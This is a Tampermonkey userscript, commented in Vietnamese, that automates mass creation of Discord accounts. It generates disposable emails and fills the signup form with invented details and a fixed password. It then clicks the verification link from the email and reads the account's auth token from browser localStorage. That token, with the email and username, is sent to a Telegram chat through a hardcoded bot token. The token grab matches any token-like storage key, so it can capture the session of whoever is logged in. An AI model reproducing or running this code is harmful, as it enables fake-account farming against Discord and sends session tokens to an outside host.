// ==UserScript==
// @name         Discord Auto Register + Auto Verify + Telegram Auto Send
// @namespace    http://tampermonkey.net/
// @version      6.4
// @description  Tự động đăng ký Discord, verify và gửi token về Telegram ngay khi có 1 token (KHÔNG AUTO RESET)
// @match        https://discord.com/register*
// @match        https://discord.com/channels/*
// @match        https://discord.com/app*
// @match        https://discord.com/verify*
// @match        https://click.discord.com/*
// @grant        GM_xmlhttpRequest
// @grant        GM_setValue
// @grant        GM_getValue
// @grant        GM_deleteValue
// @grant        GM_listValues
// @connect      api.telegram.org
// @connect      orifymail.com
// @connect      click.discord.com
// ==/UserScript==

(async () => {
  'use strict';

  // ========== CẤU HÌNH TELEGRAM BOT ==========
  const TELEGRAM_BOT_TOKEN = "8633514099:AAEcR9N74zV2oYTaHQQy18xQrosl4Q6Z5_E";
  const TELEGRAM_CHAT_ID = "-5101035864";
  const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
  
  // ========== CẤU HÌNH EMAIL API MỚI (orifymail.com) ==========
  const EMAIL_API = "https://orifymail.com/api";
  const DOMAINS = ["antdev.org", "epmtyfl.me", "sptech.io.vn"];
  
  // ========== CẤU HÌNH TỰ ĐỘNG ==========
  const AUTO_SEND_ENABLED = true;       // Bật/tắt tự động gửi
  const SEND_IMMEDIATELY = true;        // Gửi ngay khi có 1 token
  const AUTO_RESET_ENABLED = false;     // TẮT tự động reset
  
  // ========== BIẾN QUẢN LÝ ==========
  let currentEmail = GM_getValue('discord_current_email', '');
  let currentUsername = GM_getValue('discord_current_username', '');
  let tokenSent = GM_getValue('discord_token_sent', false);
  let isVerifying = GM_getValue('discord_is_verifying', false);
  let verifyStep = GM_getValue('discord_verify_step', 0);
  let accountCounter = GM_getValue('account_counter', 0);
  let autoSendTimer = null;
  let isProcessing = false;
  
  // ========== QUẢN LÝ TOKEN ==========
  const SENT_TOKENS_KEY = 'discord_sent_tokens';
  const PANEL_POSITION_KEY = 'panel_position';
  
  // Lấy vị trí panel đã lưu
  const getPanelPosition = () => {
    try {
      const pos = GM_getValue(PANEL_POSITION_KEY, '{"x":20,"y":20}');
      return JSON.parse(pos);
    } catch (e) {
      return { x: 20, y: 20 };
    }
  };
  
  // Lưu vị trí panel
  const savePanelPosition = (x, y) => {
    GM_setValue(PANEL_POSITION_KEY, JSON.stringify({ x, y }));
  };
  
  // Lấy số account đã tạo
  const getAccountCount = () => GM_getValue('account_counter', 0);
  
  // Tăng số account đã tạo
  const incrementAccountCount = () => {
    const current = getAccountCount();
    GM_setValue('account_counter', current + 1);
    return current + 1;
  };
  
  // ========== GỬI TOKEN VỀ TELEGRAM ==========
  const sendTokenToTelegram = async (tokenData) => {
    if (!AUTO_SEND_ENABLED) {
      notify("⚡ Auto-send đã tắt!", 'info');
      return false;
    }
    
    try {
      accountCounter = incrementAccountCount();
      const timestamp = new Date().toLocaleString('vi-VN');
      
      // Tạo message với thông tin chi tiết
      const accountNumber = accountCounter;
      const tokenMessage = `🎉 *ACCOUNT #${accountNumber} - THÀNH CÔNG!*\n\n` +
                          `📧 *Email:* \`${tokenData.email}\`\n` +
                          `👤 *Username:* \`${tokenData.username}\`\n` +
                          `🔑 *Token:* \`\`\`${tokenData.token}\`\`\`\n` +
                          `⏰ *Thời gian:* ${timestamp}\n` +
                          `🆔 *ID:* ${tokenData.id}\n` +
                          `🤖 *Bot:* @DINH XUAN THANG AUTO`;
      
      // Gửi thông báo bắt đầu
      const startMessage = `🚀 *ĐANG GỬI ACCOUNT #${accountNumber}...*\n` +
                          `📊 Total accounts: ${accountCounter}\n` +
                          `⚡ Mode: Instant Send (1 token = send immediately)\n` +
                          `⏸️ Auto Reset: OFF`;
      
      await sendTelegramMessage(startMessage);
      await delay(1000);
      
      // Gửi token chính
      await sendTelegramMessage(tokenMessage);
      
      // Thông báo hoàn thành
      const completionTime = new Date().toLocaleTimeString('vi-VN');
      const completionMessage = `✅ *HOÀN THÀNH ACCOUNT #${accountNumber}!*\n\n` +
                               `✨ Đã gửi thành công account thứ ${accountCounter}\n` +
                               `⏱️ Thời gian: ${completionTime}\n` +
                               `⏸️ Auto Reset: TẮT - Nhấn nút "Account Mới" để tạo tiếp`;
      
      await sendTelegramMessage(completionMessage);
      await delay(2000);
      
      // Log ra console
      console.log(`=== ACCOUNT #${accountNumber} SENT ===`);
      console.log(`Email: ${tokenData.email}`);
      console.log(`Username: ${tokenData.username}`);
      console.log(`Token: ${tokenData.token}`);
      console.log(`Time: ${timestamp}`);
      console.log(`=== END ACCOUNT #${accountNumber} ===`);
      
      // KHÔNG tự động reset nữa
      updateStatus("✅ Đã gửi thành công - Chờ tạo account mới...");
      notify("✅ Đã gửi token thành công! Nhấn 'Account Mới' để tạo tiếp", 'success');
      
      return true;
      
    } catch (error) {
      notify(`❌ Lỗi gửi Telegram: ${error.message}`, 'error');
      return false;
    }
  };
  
  // Hàm gửi message đến Telegram
  const sendTelegramMessage = (text) => {
    return new Promise((resolve, reject) => {
      GM_xmlhttpRequest({
        method: "POST",
        url: `${TELEGRAM_API}/sendMessage`,
        headers: {
          "Content-Type": "application/json"
        },
        data: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: text,
          parse_mode: "Markdown",
          disable_web_page_preview: true,
          disable_notification: false
        }),
        timeout: 10000,
        onload: (res) => {
          if (res.status === 200) {
            resolve(JSON.parse(res.responseText));
          } else {
            reject(new Error(`Telegram API: ${res.status}`));
          }
        },
        onerror: reject,
        ontimeout: () => reject(new Error("Timeout"))
      });
    });
  };
  
  // ========== PANEL ĐIỀU KHIỂN ==========
  const createControlPanel = () => {
    const pos = getPanelPosition();
    
    // Xóa panel cũ nếu có
    const oldPanel = document.querySelector('#discord-control-panel');
    if (oldPanel) oldPanel.remove();
    
    // Tạo panel mới
    const panel = document.createElement('div');
    panel.id = 'discord-control-panel';
    
    // Tạo nội dung panel
    panel.innerHTML = `
      <div id="panel-header" style="
        padding: 12px 15px;
        background: linear-gradient(135deg, #667eea, #764ba2);
        color: white;
        border-radius: 10px 10px 0 0;
        cursor: move;
        user-select: none;
        display: flex;
        justify-content: space-between;
        align-items: center;
        font-weight: bold;
        font-size: 14px;
      ">
        <span>🤖 INSTANT SEND MODE (NO AUTO RESET)</span>
        <div style="display: flex; gap: 8px;">
          <button id="minimize-btn" style="
            background: rgba(255,255,255,0.2);
            border: none;
            color: white;
            width: 24px;
            height: 24px;
            border-radius: 4px;
            cursor: pointer;
            font-size: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
          ">−</button>
          <button id="close-btn" style="
            background: rgba(255,255,255,0.2);
            border: none;
            color: white;
            width: 24px;
            height: 24px;
            border-radius: 4px;
            cursor: pointer;
            font-size: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
          ">×</button>
        </div>
      </div>
      
      <div id="panel-content" style="
        padding: 15px;
        background: rgba(255, 255, 255, 0.95);
        border-radius: 0 0 10px 10px;
        box-shadow: 0 5px 15px rgba(0,0,0,0.1);
        color: #333;
        font-size: 13px;
        max-height: 500px;
        overflow-y: auto;
      ">
        <!-- Thông tin account hiện tại -->
        <div style="margin-bottom: 15px;">
          <div style="font-size: 11px; color: #666; margin-bottom: 5px;">📧 EMAIL HIỆN TẠI</div>
          <div style="
            background: #f5f5f5;
            padding: 8px;
            border-radius: 6px;
            font-size: 12px;
            word-break: break-all;
            font-weight: 500;
          ">${currentEmail || 'Chưa có email'}</div>
        </div>
        
        <div style="margin-bottom: 15px;">
          <div style="font-size: 11px; color: #666; margin-bottom: 5px;">👤 USERNAME</div>
          <div style="
            background: #f5f5f5;
            padding: 8px;
            border-radius: 6px;
            font-size: 12px;
            font-weight: 500;
          ">${currentUsername || 'Chưa có username'}</div>
        </div>
        
        <!-- Thống kê -->
        <div style="
          background: linear-gradient(135deg, #00b09b, #96c93d);
          padding: 15px;
          border-radius: 8px;
          margin-bottom: 15px;
          text-align: center;
          color: white;
        ">
          <div style="font-size: 12px; opacity: 0.9;">📊 THỐNG KÊ</div>
          <div id="account-counter" style="font-size: 28px; font-weight: bold; margin: 5px 0;">
            ${accountCounter}
          </div>
          <div style="font-size: 11px;">
            ⚡ 1 TOKEN = GỬI NGAY
          </div>
          <div style="font-size: 11px; margin-top: 5px; background: rgba(255,255,255,0.2); padding: 3px; border-radius: 4px;">
            ⏸️ AUTO RESET: TẮT
          </div>
        </div>
        
        <!-- Trạng thái -->
        <div style="display: flex; justify-content: space-between; margin-bottom: 15px;">
          <div style="text-align: center;">
            <div style="font-size: 11px; color: #666;">🔧 TRẠNG THÁI</div>
            <div id="status-display" style="font-size: 12px; font-weight: 500; color: #00b09b;">
              ${isVerifying ? `🔵 Verify (Bước ${verifyStep})` : tokenSent ? '✅ Đã gửi' : isProcessing ? '🔄 Đang xử lý' : '🟡 Chờ'}
            </div>
          </div>
          <div style="text-align: center;">
            <div style="font-size: 11px; color: #666;">⚡ CHẾ ĐỘ</div>
            <div style="font-size: 12px; font-weight: 500; color: #667eea;">
              ${SEND_IMMEDIATELY ? 'INSTANT SEND' : 'NORMAL'}
            </div>
          </div>
        </div>
        
        <!-- Nút điều khiển -->
        <div style="
          display: grid;
          grid-template-columns: 1fr 1fr;
          gap: 10px;
          margin-bottom: 10px;
        ">
          <button id="panel-reset-btn" style="
            padding: 10px;
            background: linear-gradient(135deg, #ff416c, #ff4b2b);
            color: white;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            font-weight: bold;
            font-size: 12px;
            transition: all 0.3s ease;
          ">🔄 Tạo Account Mới</button>
          
          <button id="panel-manual-send" style="
            padding: 10px;
            background: linear-gradient(135deg, #667eea, #764ba2);
            color: white;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            font-weight: bold;
            font-size: 12px;
            transition: all 0.3s ease;
          ">📤 Gửi Thủ Công</button>
        </div>
        
        <!-- Thông tin thêm -->
        <div style="
          padding: 8px;
          background: #f8f9fa;
          border-radius: 6px;
          font-size: 11px;
          color: #666;
          text-align: center;
          border: 1px solid #e9ecef;
        ">
          <div>🤖 @DINH XUAN THANG INSTANT BOT</div>
          <div>⚡ 1 TOKEN = GỬI NGAY VỀ TELEGRAM</div>
          <div style="color: #ff416c; font-weight: bold;">⏸️ KHÔNG AUTO RESET - Nhấn nút để tạo tiếp</div>
          <div>💾 Kéo header để di chuyển panel</div>
        </div>
      </div>
    `;
    
    // Đặt style cho panel
    panel.style.cssText = `
      position: fixed;
      top: ${pos.y}px;
      left: ${pos.x}px;
      width: 320px;
      z-index: 1000000;
      border-radius: 10px;
      box-shadow: 0 10px 30px rgba(0,0,0,0.3);
      backdrop-filter: blur(10px);
      border: 1px solid rgba(255,255,255,0.2);
      overflow: hidden;
      transition: all 0.3s ease;
      resize: both;
      min-width: 300px;
      min-height: 200px;
      max-width: 500px;
      max-height: 600px;
    `;
    
    // Thêm panel vào body
    document.body.appendChild(panel);
    
    // ========== CHỨC NĂNG KÉO THẢ ==========
    const header = panel.querySelector('#panel-header');
    let isDragging = false;
    let initialX, initialY;
    
    // Sự kiện bắt đầu kéo
    header.addEventListener('mousedown', startDrag);
    
    function startDrag(e) {
      if (e.target.id === 'minimize-btn' || e.target.id === 'close-btn') {
        return;
      }
      
      isDragging = true;
      
      // Lấy vị trí hiện tại
      const rect = panel.getBoundingClientRect();
      initialX = e.clientX - rect.left;
      initialY = e.clientY - rect.top;
      
      // Thay đổi cursor
      header.style.cursor = 'grabbing';
      panel.style.opacity = '0.9';
      
      // Thêm sự kiện di chuyển và thả
      document.addEventListener('mousemove', drag);
      document.addEventListener('mouseup', stopDrag);
    }
    
    function drag(e) {
      if (!isDragging) return;
      
      e.preventDefault();
      
      // Tính vị trí mới
      let newX = e.clientX - initialX;
      let newY = e.clientY - initialY;
      
      // Giới hạn trong viewport
      const viewportWidth = window.innerWidth;
      const viewportHeight = window.innerHeight;
      const panelWidth = panel.offsetWidth;
      const panelHeight = panel.offsetHeight;
      
      newX = Math.max(0, Math.min(newX, viewportWidth - panelWidth));
      newY = Math.max(0, Math.min(newY, viewportHeight - panelHeight));
      
      // Cập nhật vị trí
      panel.style.left = `${newX}px`;
      panel.style.top = `${newY}px`;
    }
    
    function stopDrag(e) {
      if (!isDragging) return;
      
      isDragging = false;
      header.style.cursor = 'move';
      panel.style.opacity = '1';
      
      // Lưu vị trí
      const rect = panel.getBoundingClientRect();
      savePanelPosition(rect.left, rect.top);
      
      // Xóa sự kiện
      document.removeEventListener('mousemove', drag);
      document.removeEventListener('mouseup', stopDrag);
    }
    
    // ========== CHỨC NĂNG NÚT ==========
    // Nút thu nhỏ
    panel.querySelector('#minimize-btn').addEventListener('click', () => {
      const content = panel.querySelector('#panel-content');
      if (content.style.display === 'none') {
        content.style.display = 'block';
        panel.style.height = 'auto';
      } else {
        content.style.display = 'none';
        panel.style.height = '50px';
      }
    });
    
    // Nút đóng
    panel.querySelector('#close-btn').addEventListener('click', () => {
      panel.style.display = 'none';
      setTimeout(() => {
        panel.style.display = 'block';
      }, 5000);
    });
    
    // Nút Tạo Account Mới
    panel.querySelector('#panel-reset-btn').addEventListener('click', () => {
      if (confirm('Tạo account mới ngay bây giờ?')) {
        resetForNewAccount();
      }
    });
    
    // Nút Gửi Thủ Công
    panel.querySelector('#panel-manual-send').addEventListener('click', () => {
      if (!currentEmail || !currentUsername) {
        notify("Chưa có thông tin account để gửi!", 'error');
        return;
      }
      
      const token = captureToken();
      if (token) {
        const tokenData = {
          token: token,
          email: currentEmail,
          username: currentUsername,
          id: Date.now().toString(),
          timestamp: new Date().toISOString()
        };
        
        sendTokenToTelegram(tokenData);
      } else {
        notify("Không tìm thấy token!", 'error');
      }
    });
    
    // Thêm hiệu ứng hover cho các nút
    const buttons = panel.querySelectorAll('button');
    buttons.forEach(btn => {
      if (btn.id !== 'minimize-btn' && btn.id !== 'close-btn') {
        btn.addEventListener('mouseenter', () => {
          btn.style.transform = 'translateY(-2px)';
          btn.style.boxShadow = '0 4px 8px rgba(0,0,0,0.2)';
        });
        btn.addEventListener('mouseleave', () => {
          btn.style.transform = 'translateY(0)';
          btn.style.boxShadow = 'none';
        });
      }
    });
    
    return panel;
  };
  
  // ========== CÁC HÀM HIỂN THỊ ==========
  const notify = (msg, type = 'success') => {
    // Xóa thông báo cũ
    const oldNotif = document.querySelector('.temp-notification');
    if (oldNotif) oldNotif.remove();
    
    const n = document.createElement('div');
    n.className = 'temp-notification';
    n.textContent = msg;
    const colors = {
      success: 'linear-gradient(135deg, #00b09b, #96c93d)',
      info: 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)',
      error: 'linear-gradient(135deg, #ff416c, #ff4b2b)',
      warning: 'linear-gradient(135deg, #f46b45, #eea849)'
    };
    n.style.cssText = `
      position: fixed;
      top: 80px;
      right: 20px;
      padding: 12px 18px;
      background: ${colors[type]};
      color: white;
      border-radius: 10px;
      z-index: 1000001;
      font-size: 13px;
      box-shadow: 0 6px 12px rgba(0,0,0,0.2);
      animation: slideIn 0.3s ease-out;
      font-weight: 500;
      max-width: 300px;
      word-wrap: break-word;
      backdrop-filter: blur(5px);
    `;
    
    if (!document.querySelector('#notif-style')) {
      const s = document.createElement('style');
      s.id = 'notif-style';
      s.textContent = `
        @keyframes slideIn {
          from { transform: translateX(400px); opacity: 0; }
          to { transform: translateX(0); opacity: 1; }
        }
        @keyframes slideOut {
          from { transform: translateX(0); opacity: 1; }
          to { transform: translateX(400px); opacity: 0; }
        }
      `;
      document.head.appendChild(s);
    }
    
    document.body.appendChild(n);
    setTimeout(() => {
      n.style.animation = 'slideOut 0.3s ease-out';
      setTimeout(() => n.remove(), 300);
    }, 3000);
  };
  
  const updateStatus = (text) => {
    const status = document.querySelector('#status-display');
    if (status) {
      status.textContent = text;
      // Đổi màu theo trạng thái
      if (text.includes('✅')) status.style.color = '#00b09b';
      else if (text.includes('🔵')) status.style.color = '#667eea';
      else if (text.includes('🟡')) status.style.color = '#f46b45';
      else if (text.includes('🔄')) status.style.color = '#764ba2';
      else if (text.includes('📤')) status.style.color = '#667eea';
    }
  };
  
  const updateAccountCounter = () => {
    const counter = document.querySelector('#account-counter');
    if (counter) {
      counter.textContent = accountCounter;
    }
  };
  
  // ========== HÀM TIỆN ÍCH ==========
  const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));
  
  const setVal = (el, val) => {
    const setter = Object.getOwnPropertyDescriptor(el.__proto__, 'value').set;
    const proto = Object.getPrototypeOf(el);
    const protoSetter = Object.getOwnPropertyDescriptor(proto, 'value').set;
    (setter && setter !== protoSetter ? protoSetter : setter).call(el, val);
    el.dispatchEvent(new Event('input', { bubbles: true }));
    el.dispatchEvent(new Event('change', { bubbles: true }));
  };
  
  // ========== HÀM CHÍNH ==========
  const generateEmail = () => {
    const randomDomain = DOMAINS[Math.floor(Math.random() * DOMAINS.length)];
    const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
    let randomStr = '';
    for (let i = 0; i < 8; i++) {
      randomStr += chars[Math.floor(Math.random() * chars.length)];
    }
    const insertPos = Math.floor(Math.random() * (randomStr.length + 1));
    randomStr = randomStr.slice(0, insertPos) + 'dinhxuanthang' + randomStr.slice(insertPos);
    return `${randomStr}@${randomDomain}`;
  };
  
  // ========== HÀM LẤY EMAIL TỪ ORIFYMAIL ==========
  const getEmailMessages = (email) => new Promise((resolve, reject) => {
    const encodedEmail = encodeURIComponent(email);
    GM_xmlhttpRequest({
      method: "GET",
      url: `${EMAIL_API}/email/${encodedEmail}`,
      headers: { 
        "Accept": "application/json",
        "Content-Type": "application/json"
      },
      timeout: 10000,
      onload: res => {
        try {
          if (res.status === 200) {
            const json = JSON.parse(res.responseText);
            resolve(json);
          } else if (res.status === 404) {
            // Không có email nào
            resolve([]);
          } else {
            reject(`API error: ${res.status}`);
          }
        } catch (e) { 
          reject("Parse error: " + e.message); 
        }
      },
      onerror: () => reject("Connection failed"),
      ontimeout: () => reject("Timeout")
    });
  });
  
  const getMessageBody = (msgId) => new Promise((resolve, reject) => {
    GM_xmlhttpRequest({
      method: "GET",
      url: `${EMAIL_API}/inbox/${msgId}`,
      headers: { 
        "Accept": "application/json",
        "Content-Type": "application/json"
      },
      timeout: 10000,
      onload: res => {
        try {
          if (res.status === 200) {
            const json = JSON.parse(res.responseText);
            resolve(json);
          } else {
            reject(`API error: ${res.status}`);
          }
        } catch (e) { 
          reject("Parse error: " + e.message); 
        }
      },
      onerror: () => reject("Connection failed"),
      ontimeout: () => reject("Timeout")
    });
  });
  
  const extractVerifyLink = (text) => {
    // Tìm link verify của Discord trong nội dung email
    const regex = /https:\/\/click\.discord\.com\/ls\/click\?upn=[^\s"']+/g;
    const matches = text.match(regex);
    if (!matches || matches.length === 0) return null;
    return matches[0];
  };
  
  const waitForVerifyEmail = async (email, maxAttempts = 30) => {
    notify(`Đang kiểm tra email: ${email}`, 'info');
    
    for (let i = 0; i < maxAttempts; i++) {
      try {
        console.log(`Kiểm tra email lần thứ ${i + 1}/${maxAttempts}`);
        const messages = await getEmailMessages(email);
        
        if (Array.isArray(messages) && messages.length > 0) {
          console.log("Tìm thấy messages:", messages);
          
          // Tìm email từ Discord
          const verifyMsg = messages.find(m =>
            m.fromAddress && 
            (m.fromAddress.includes("noreply@discord.com") || 
             m.fromAddress.includes("discord")) &&
            (m.subject?.includes("Xác Nhận") || 
             m.subject?.includes("verify") || 
             m.subject?.includes("xác thực") ||
             m.subject?.includes("email"))
          );
          
          if (verifyMsg && verifyMsg.id) {
            notify(`Đã tìm thấy email verify: ${verifyMsg.subject}`, 'success');
            console.log("Verify message found:", verifyMsg);
            
            // Lấy nội dung chi tiết của email
            const body = await getMessageBody(verifyMsg.id);
            console.log("Email body:", body);
            
            // Kết hợp textContent và htmlContent để tìm link
            const fullText = (body.textContent || '') + ' ' + (body.htmlContent || '');
            const link = extractVerifyLink(fullText);
            
            if (link) {
              notify("✅ Đã tìm thấy link verify!", 'success');
              return link;
            } else {
              console.log("Không tìm thấy link verify trong nội dung");
            }
          } else {
            console.log("Chưa có email từ Discord");
          }
        } else {
          console.log("Chưa có email nào");
        }
      } catch (e) {
        console.error("Check email error:", e);
      }
      
      // Đợi 3 giây trước khi kiểm tra lại
      await delay(3000);
    }
    
    throw new Error("Không tìm thấy email verify sau 30 lần thử");
  };
  
  // Gửi token và KHÔNG tự động reset
  const sendAndReset = async (token, email, username) => {
    if (tokenSent) return;
    
    isProcessing = true;
    updateStatus("📤 Đang gửi token...");
    
    const tokenData = {
      token: token.replace(/"/g, ''),
      email: email,
      username: username,
      id: Date.now().toString(),
      timestamp: new Date().toISOString()
    };
    
    // Gửi token về Telegram
    if (AUTO_SEND_ENABLED && SEND_IMMEDIATELY) {
      await sendTokenToTelegram(tokenData);
    } else {
      // Nếu không tự động gửi, chỉ thông báo
      notify("✅ Đã lấy được token! (Chế độ thủ công)", 'success');
      updateStatus("✅ Token đã sẵn sàng");
    }
    
    tokenSent = true;
    GM_setValue('discord_token_sent', true);
    
    // KHÔNG tự động reset nữa
    updateStatus("✅ Đã gửi xong - Nhấn 'Account Mới' để tạo tiếp");
    isProcessing = false;
  };
  
  // ========== HÀM ĐIỀN FORM ==========
  const fillDOB = async () => {
    const dob = randomDOB();
    console.log(`Chọn ngày sinh: ${dob.day}/${dob.month}/${dob.year}`);

    const selectDropdownValue = async (dropdownType, value) => {
      const selectors = [
        `div[aria-label*="${dropdownType}"]`,
        `div[aria-label*="${dropdownType.toLowerCase()}"]`,
        `div[class*="${dropdownType.toLowerCase()}"]`,
        `div[data-type="${dropdownType}"]`
      ];

      let dropdown = null;
      for (const selector of selectors) {
        dropdown = document.querySelector(selector);
        if (dropdown) break;
      }

      if (!dropdown) {
        console.log(`Không tìm thấy dropdown ${dropdownType}`);
        return false;
      }

      dropdown.click();
      await delay(1500);

      let clicked = false;
      const allOptions = Array.from(document.querySelectorAll('div[role="option"], div[class*="option"], div[class*="item"]'));
      for (const option of allOptions) {
        const optionText = option.textContent?.trim() || '';
        if (optionText === value.toString() || optionText.includes(value.toString())) {
          option.click();
          clicked = true;
          break;
        }
      }

      if (!clicked) {
        const allDivs = Array.from(document.querySelectorAll('div'));
        for (const div of allDivs) {
          const divText = div.textContent?.trim() || '';
          if (divText === value.toString()) {
            div.click();
            clicked = true;
            break;
          }
        }
      }

      await delay(1000);
      return clicked;
    };

    await delay(2000);
    await selectDropdownValue("Ngày", dob.day.toString());
    await delay(1000);

    const monthNames = ["tháng 1", "tháng 2", "tháng 3", "tháng 4", "tháng 5", "tháng 6",
                       "tháng 7", "tháng 8", "tháng 9", "tháng 10", "tháng 11", "tháng 12"];
    const monthName = monthNames[dob.month - 1];

    let monthSelected = await selectDropdownValue("Tháng", dob.month.toString());
    if (!monthSelected) {
      await selectDropdownValue("Tháng", monthName);
    }
    await delay(1000);

    await selectDropdownValue("Năm", dob.year.toString());
    await delay(1000);

    notify(`Đã chọn ngày sinh: ${dob.day}/${dob.month}/${dob.year}`, 'success');
  };
  
  const randomDOB = () => {
    const currentYear = new Date().getFullYear();
    const minYear = currentYear - 40;
    const maxYear = currentYear - 18;

    const year = Math.floor(Math.random() * (maxYear - minYear + 1)) + minYear;
    const month = Math.floor(Math.random() * 12) + 1;
    const day = Math.floor(Math.random() * 28) + 1;

    return { year, month, day };
  };
  
  const fillFormWithDelay = async () => {
    isProcessing = true;
    updateStatus("🔄 Đang tạo account...");
    notify("Đang đợi form tải...", 'info');
    await delay(2000);

    const email = generateEmail();
    currentEmail = email;
    GM_setValue('discord_current_email', currentEmail);
    notify("📧 Email: " + currentEmail, 'success');
    
    updateStatus("📧 Đang điền form...");

    const username = "regaccbydinhxuanthang" + Math.random().toString(36).slice(2, 7);
    currentUsername = username;
    GM_setValue('discord_current_username', username);

    const password = "kjtdzqa123@";
    const displayName = "dinhxuanthang";

    const emailInput = document.querySelector('input[type="email"][aria-label="Email"],input[name="email"]');
    if (!emailInput) {
      notify("Không tìm thấy input email", 'error');
      isProcessing = false;
      return;
    }

    notify("Đang điền email...", 'info');
    setVal(emailInput, currentEmail);
    await delay(1000);

    const displayNameInput = document.querySelector('input[aria-label="Tên hiển thị"]');
    if (displayNameInput) {
      setVal(displayNameInput, displayName);
      await delay(500);
    }

    const usernameInput = document.querySelector('input[aria-label="Tên đăng nhập"]');
    if (usernameInput) {
      setVal(usernameInput, username);
      await delay(500);
    }

    const passwordInput = document.querySelector('input[aria-label="Mật khẩu"]');
    if (passwordInput) {
      setVal(passwordInput, password);
      await delay(500);
    }

    const passwordConfirmInput = document.querySelector('input[aria-label="Xác nhận mật khẩu"]');
    if (passwordConfirmInput) {
      setVal(passwordConfirmInput, password);
      await delay(500);
    }

    notify("Đang điền ngày sinh...", 'info');
    await fillDOB();

    document.querySelectorAll('input[type="checkbox"]').forEach(cb => {
      if (!cb.checked && cb.labels?.[0] && /email/i.test(cb.labels[0].textContent)) {
        cb.click();
      }
    });

    // Nút reset email
    let resetBtn = document.querySelector("#resetEmailBtn");
    const submitBtn = document.querySelector('button[type="submit"].button__921c5');
    if (!resetBtn && submitBtn) {
      resetBtn = document.createElement("button");
      resetBtn.id = "resetEmailBtn";
      resetBtn.textContent = "Reset Mail";
      resetBtn.style.cssText = "margin-top:10px;padding:12px;cursor:pointer;background:linear-gradient(135deg, #fa709a 0%, #fee140 100%);color:white;border:none;border-radius:10px;font-weight:bold;transition:all 0.3s ease;box-shadow:0 4px 12px rgba(250,112,154,0.4)";
      resetBtn.type = "button";
      submitBtn.parentNode.insertBefore(resetBtn, submitBtn.nextSibling);

      resetBtn.addEventListener('mouseenter', () => {
        resetBtn.style.transform = 'translateY(-2px)';
        resetBtn.style.boxShadow = '0 6px 16px rgba(250,112,154,0.6)';
      });
      resetBtn.addEventListener('mouseleave', () => {
        resetBtn.style.transform = 'translateY(0)';
        resetBtn.style.boxShadow = '0 4px 12px rgba(250,112,154,0.4)';
      });

      resetBtn.onclick = async () => {
        const newEmail = generateEmail();
        currentEmail = newEmail;
        GM_setValue('discord_current_email', currentEmail);
        notify("📧 Email mới: " + currentEmail, 'success');
        updateStatus("📧 Đã đổi email");
        if (emailInput) setVal(emailInput, currentEmail);
      };
    }

    notify("✅ Đã điền xong form! Tiếp tục verify...", 'success');
    updateStatus("✅ Form đã sẵn sàng");
    isProcessing = false;
    
    // Tự động submit form sau 2 giây
    if (submitBtn) {
      setTimeout(() => {
        notify("🔄 Đang submit form...", 'info');
        submitBtn.click();
      }, 2000);
    }
  };
  
  // ========== HÀM VERIFY ==========
  const autoVerify = async () => {
    if (isVerifying || tokenSent) return;

    isVerifying = true;
    verifyStep = 1;
    GM_setValue('discord_is_verifying', true);
    GM_setValue('discord_verify_step', 1);

    updateStatus("🔵 Đang đợi email verify...");
    notify("Đang đợi email verify...", 'info');

    try {
      const verifyLink = await waitForVerifyEmail(currentEmail);
      console.log("Found verify link:", verifyLink);
      notify("✅ Đã tìm thấy link verify!", 'success');

      verifyStep = 2;
      GM_setValue('discord_verify_step', 2);
      updateStatus("🔵 Đang chuyển đến link verify...");

      setTimeout(() => {
        window.location.href = verifyLink;
      }, 2000);

    } catch (e) {
      notify(e.message, 'error');
      updateStatus("❌ Lỗi verify");
      isVerifying = false;
      GM_setValue('discord_is_verifying', false);
      GM_setValue('discord_verify_step', 0);
    }
  };
  
  const handleVerifyLink = () => {
    const url = window.location.href;
    if (url.includes('click.discord.com')) {
      verifyStep = 3;
      GM_setValue('discord_verify_step', 3);

      notify("Đang xác thực...", 'info');
      updateStatus("🔵 Đang xác thực...");

      setTimeout(() => {
        verifyStep = 4;
        GM_setValue('discord_verify_step', 4);
        notify("✅ Đã verify, đang chuyển đến Discord...", 'success');
        updateStatus("✅ Đã verify");
        window.location.href = "https://discord.com/channels/@me";
      }, 5000);
    }
  };
  
  // ========== HÀM LẤY TOKEN ==========
  const captureToken = () => {
    // Tìm token trong localStorage
    const token = localStorage.getItem('token');
    if (token) return token.replace(/"/g, '');
    
    // Tìm trong tất cả các keys của localStorage
    for (let i = 0; i < localStorage.length; i++) {
      const key = localStorage.key(i);
      if (key.includes('token') || key.includes('Token')) {
        const value = localStorage.getItem(key);
        if (value && value.length > 50) {
          return value.replace(/"/g, '');
        }
      }
    }
    
    return null;
  };
  
  const checkLogin = () => {
    if (tokenSent) return;

    const url = window.location.href;
    if (url.includes('/channels/') || url.includes('/app')) {

      if (isVerifying && verifyStep === 4) {
        verifyStep = 5;
        GM_setValue('discord_verify_step', 5);

        updateStatus("🔵 Đang lấy token...");
        notify("Đang lấy token cho " + currentUsername, 'info');
      }

      const token = captureToken();
      if (token && !tokenSent) {
        sendAndReset(token, currentEmail, currentUsername);
      } else if (!tokenSent) {
        // Thử lại sau 2 giây
        setTimeout(checkLogin, 2000);
      }
    }
  };
  
  // ========== HÀM RESET ==========
  const resetForNewAccount = () => {
    isProcessing = true;
    updateStatus("🔄 Đang reset...");
    notify("🔄 Đang reset để tạo account mới...", 'info');
    
    // Xóa dữ liệu tạm
    localStorage.clear();
    sessionStorage.clear();
    document.cookie.split(";").forEach(c => document.cookie = c.replace(/^ +/, "").replace(/=.*/, "=;expires=" + new Date().toUTCString() + ";path=/"));
    
    // Reset biến
    currentEmail = '';
    currentUsername = '';
    tokenSent = false;
    isVerifying = false;
    verifyStep = 0;
    
    GM_setValue('discord_current_email', '');
    GM_setValue('discord_current_username', '');
    GM_setValue('discord_token_sent', false);
    GM_setValue('discord_is_verifying', false);
    GM_setValue('discord_verify_step', 0);
    
    isProcessing = false;
    updateStatus("🟡 Sẵn sàng");
    
    // Chuyển đến trang đăng ký
    setTimeout(() => {
      notify("🚀 Chuyển đến trang đăng ký mới...", 'success');
      window.location.replace('https://discord.com/register');
    }, 2000);
  };
  
  // ========== KHỞI ĐỘNG ==========
